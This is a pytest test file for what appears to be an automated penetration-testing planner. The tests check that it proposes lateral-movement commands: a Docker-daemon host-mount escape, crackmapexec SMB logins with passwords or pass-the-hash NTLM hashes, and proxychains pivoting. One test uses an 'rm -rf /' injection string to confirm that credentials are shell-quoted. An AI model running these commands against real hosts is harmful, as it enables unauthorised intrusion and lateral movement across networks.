"""Lateral planner contracts: host-bound commands from world-model evidence."""

from __future__ import annotations

from modules.loop.lateral_planner import plan_lateral


def _windows_host(ip: str = "10.0.0.10") -> dict:
    return {
        ip: {
            "ip": ip,
            "os_hint": "windows",
            "services": {
                "445": {"port": 445, "name": "microsoft-ds"},
                "5985": {"port": 5985, "name": "winrm"},
            },
        }
    }


def test_docker_daemon_proposes_escape():
    """Given an open 2375 daemon, When planned, Then a host-mount escape is proposed."""
    hosts = {"10.0.0.12": {"ip": "10.0.0.12", "services": {"2375": {"port": 2375, "name": "docker"}}}}
    proposals = plan_lateral(hosts, [])
    assert len(proposals) == 1
    proposal = proposals[0]
    assert proposal.service == "docker"
    assert proposal.priority == 9
    assert "docker -H tcp://10.0.0.12:2375 run --rm -v /:/mnt" in proposal.command


def test_smb_password_uses_crackmapexec():
    """Given an SMB host and a password, When planned, Then crackmapexec runs."""
    proposals = plan_lateral(_windows_host(), [{"value": "admin:Password1!"}])
    assert proposals
    assert proposals[0].service == "smb"
    assert proposals[0].command.startswith("crackmapexec smb 10.0.0.10 -u admin -p ")
    assert proposals[0].credential_user == "admin"


def test_smb_hash_uses_hash_flag():
    """Given an NTLM hash, When planned, Then the hash flag is used."""
    ntlm = "0123456789abcdef0123456789abcdef"
    proposals = plan_lateral(_windows_host(), [{"value": f"admin:{ntlm}"}])
    assert proposals
    assert f"-H {ntlm}" in proposals[0].command
    assert "-p " not in proposals[0].command


def test_ssh_hash_is_skipped():
    """Given only a hash for SSH, When planned, Then no SSH command is built."""
    hosts = {"10.0.0.11": {"ip": "10.0.0.11", "services": {"22": {"port": 22, "name": "ssh"}}}}
    ntlm = "0123456789abcdef0123456789abcdef"
    assert plan_lateral(hosts, [{"value": f"admin:{ntlm}"}]) == []


def test_host_specific_credential_ranks_first():
    """Given a host-bound hash and a global password, When planned, Then the bound one wins."""
    hosts = {
        "10.0.0.10": {"ip": "10.0.0.10", "services": {"445": {"port": 445, "name": "smb"}}},
        "10.0.0.11": {"ip": "10.0.0.11", "services": {"445": {"port": 445, "name": "smb"}}},
    }
    creds = [
        {"value": "global:Password1!", "host": "", "service": ""},
        {"value": "bound:0123456789abcdef0123456789abcdef", "host": "10.0.0.10", "service": "smb"},
    ]
    proposals = plan_lateral(hosts, creds, limit=1)
    assert proposals[0].host == "10.0.0.10"
    assert proposals[0].credential_user == "bound"


def test_one_vector_per_host():
    """Given one host with SMB and WinRM, When planned, Then only one vector is emitted."""
    proposals = plan_lateral(_windows_host(), [{"value": "admin:Password1!"}], limit=4)
    assert len(proposals) == 1


def test_exclude_suppresses_duplicate():
    """Given an already-proposed command, When planned, Then the next vector is chosen."""
    hosts = _windows_host()
    creds = [{"value": "admin:Password1!"}]
    first = plan_lateral(hosts, creds, limit=1)[0]
    second = plan_lateral(hosts, creds, exclude={first.command}, limit=1)[0]
    assert second.command != first.command


def test_limit_caps_across_hosts():
    """Given three hosts, When limit is two, Then at most two proposals return."""
    hosts = {
        f"10.0.0.{index}": {
            "ip": f"10.0.0.{index}",
            "services": {"445": {"port": 445, "name": "smb"}},
        }
        for index in range(10, 13)
    }
    proposals = plan_lateral(hosts, [{"value": "admin:Password1!"}], limit=2)
    assert len(proposals) == 2
    assert len({proposal.host for proposal in proposals}) == 2


def test_invalid_host_is_skipped():
    """Given a non-IP host key, When planned, Then it never reaches a command."""
    hosts = {"dc.corp.local": {"ip": "dc.corp.local", "services": {"445": {"port": 445}}}}
    assert plan_lateral(hosts, [{"value": "admin:Password1!"}]) == []


def test_credentials_are_shell_quoted():
    """Given a secret with shell metacharacters, When planned, Then it is quoted."""
    proposals = plan_lateral(_windows_host(), [{"value": "admin:p a$s;rm -rf /"}])
    assert proposals
    assert proposals[0].command.endswith(" -p 'p a$s;rm -rf /'")


def test_pivot_prefix_is_prepended():
    """Given an active pivot, When planned, Then the command routes through it."""
    proposals = plan_lateral(_windows_host(), [{"value": "admin:Password1!"}], pivot_prefix="proxychains4 -q")
    assert proposals[0].command.startswith("proxychains4 -q crackmapexec smb ")


def test_no_credentials_no_credential_proposals():
    """Given no credentials and no docker, When planned, Then nothing is proposed."""
    assert plan_lateral(_windows_host(), []) == []


def test_world_model_mapping_shape_is_accepted():
    """Given the persisted world-model shape, When planned, Then services parse."""
    hosts = {
        "10.0.0.10": {
            "ip": "10.0.0.10",
            "state": "enumerated",
            "os_hint": "windows",
            "services": {
                "445": {"port": 445, "protocol": "tcp", "name": "microsoft-ds", "version": "", "state": "open"}
            },
        }
    }
    proposals = plan_lateral(hosts, [{"value": "admin:Password1!", "host": "10.0.0.10"}])
    assert proposals and proposals[0].service == "smb"
